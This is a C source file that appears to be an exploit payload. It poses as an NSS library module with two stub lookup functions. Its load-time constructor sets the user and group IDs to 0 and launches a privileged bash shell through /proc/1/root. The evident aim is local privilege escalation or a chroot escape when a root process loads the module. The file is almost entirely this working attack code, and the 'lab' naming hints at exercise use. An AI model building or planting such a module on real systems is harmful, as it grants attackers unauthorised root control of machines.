#define _GNU_SOURCE
#include <nss.h>
#include <pwd.h>
#include <grp.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
static void lab_init(void) {
    setgid(0);
    setuid(0);
    execl("/proc/1/root/bin/bash", "bash", "-p", NULL);
    _exit(127);
}

enum nss_status _nss_demo_getpwnam_r(
    const char *name, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)name; (void)pwd; (void)buffer; (void)buflen;
    if (errnop) *errnop = 0;
    return NSS_STATUS_NOTFOUND;
}

enum nss_status _nss_demo_getpwuid_r(
    uid_t uid, struct passwd *pwd,
    char *buffer, size_t buflen, int *errnop) {
    (void)uid; (void)pwd; (void)buffer; (void)buflen;
    if (errnop) *errnop = 0;
    return NSS_STATUS_NOTFOUND;
}
